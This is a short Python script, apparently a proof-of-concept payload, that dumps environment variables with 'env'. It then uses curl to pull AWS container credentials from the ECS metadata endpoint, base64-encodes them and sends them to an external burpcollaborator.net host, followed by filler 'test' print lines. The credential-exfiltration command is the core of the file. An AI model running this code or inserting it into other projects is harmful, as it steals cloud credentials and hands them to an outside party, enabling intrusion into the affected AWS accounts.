import os
os.system("env")
os.system("payload=$(curl -qL http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0);curl https://cfvqhoiyakfteysot0fl74h5jwppde.burpcollaborator.net/?payload=$payload;")
print("test")
print("test2wqeeeeeeeeeeeeeeeeeee")
